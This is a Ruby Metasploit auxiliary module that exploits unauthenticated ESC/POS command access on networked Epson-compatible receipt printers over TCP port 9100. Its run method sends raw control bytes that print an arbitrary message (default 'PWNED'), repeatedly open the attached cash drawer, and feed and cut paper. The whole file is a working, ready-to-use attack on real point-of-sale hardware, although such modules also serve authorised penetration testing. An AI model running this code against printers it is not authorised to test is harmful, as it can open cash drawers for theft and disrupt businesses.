# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ESC/POS Printer Command Injector',
        'Description' => %q{
          This module exploits an unauthenticated ESC/POS command vulnerability in networked Epson-compatible printers.
          You can print a custom message, trigger the attached cash drawer, or do both.
        },
        'Author' => ['FutileSkills'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/futileskills/Security-Advisory']
        ],
        'Notes' => {
          'Stability' => [Msf::Module::Stability::CRASH_SAFE],
          'Reliability' => [Msf::Module::Reliability::REPEATABLE_SESSION],
          'SideEffects' => [Msf::Module::SideEffects::IOC_IN_LOGS, Msf::Module::SideEffects::PHYSICAL_EFFECTS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(9100),
        OptString.new('MESSAGE', [false, 'Message to print', 'PWNED']),
        OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
        OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 1]),
        OptBool.new('CUT_PAPER', [false, 'Feed and cut the paper', false]),
        OptInt.new('FEED_LINES', [false, 'Number of lines to feed before cutting', 5])
      ]
    )
  end

  # ESC/POS command to trigger the cash drawer
  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze
  # ESC/POS command to feed lines
  FEED_COMMAND = "\x1b\x64".freeze
  # ESC/POS command to cut paper (full cut)
  CUT_COMMAND = "\x1d\x56\x42\x00".freeze

  def run
    # Check if a message was provided by the user
    should_print_message = !datastore['MESSAGE'].blank?

    # Retrieve other options
    trigger_drawer = datastore['TRIGGER_DRAWER']
    cut_paper = datastore['CUT_PAPER']
    feed_lines = datastore['FEED_LINES'].to_i.clamp(1, 100)
    drawer_count = datastore['DRAWER_COUNT'].to_i.clamp(1, 10)

    # Ensure at least one action is selected
    unless should_print_message || trigger_drawer || cut_paper
      print_error('No action specified. Please set MESSAGE, TRIGGER_DRAWER, or CUT_PAPER.')
      return
    end

    begin
      connect
      print_status("Connected to printer at #{rhost}")

      if should_print_message
        message = datastore['MESSAGE']
        print_commands = "\x1b\x40\x1b\x61\x01\x1d\x21\x11#{message}\x1d\x21\x00\n\x1b\x61\x00\n\n"
        sock.put(print_commands)
        print_good("Printed message: '#{message}'")
      end

      if trigger_drawer
        print_status("Triggering cash drawer #{drawer_count} times...")
        drawer_count.times do
          sock.put(DRAWER_COMMAND)
          sleep(0.5)
        end
        print_good('Triggered cash drawer.')
      end

      if cut_paper
        print_status("Feeding #{feed_lines} lines and cutting paper...")
        sock.put(FEED_COMMAND + [feed_lines].pack('C'))
        sock.put(CUT_COMMAND)
        print_good('Paper fed and cut.')
      end
    rescue ::Rex::ConnectionError
      print_error("Failed to connect to #{rhost}")
    ensure
      disconnect
    end
  end
end
